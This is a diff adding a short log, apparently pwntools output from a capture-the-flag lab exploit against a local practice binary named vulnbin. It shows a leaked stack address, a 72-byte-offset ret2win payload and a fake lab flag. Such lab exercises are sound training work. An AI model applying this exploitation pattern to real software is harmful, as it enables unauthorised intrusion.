@@ -1,0 +1,8 @@
+[+] Starting local process '/opt/lab/vulnbin': pid 1337
+[*] Loaded 1 cached gadget for '/opt/lab/vulnbin'
+vulnbin: enter your name:
+[*] leaked stack address 0x7ffd1a2b3c40
+hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+[+] Sending ret2win payload (offset 72)
+flag{f4ke_l4b_r3t2w1n_fl4g}
+[*] Process '/opt/lab/vulnbin' stopped with exit code 0 (pid 1337)
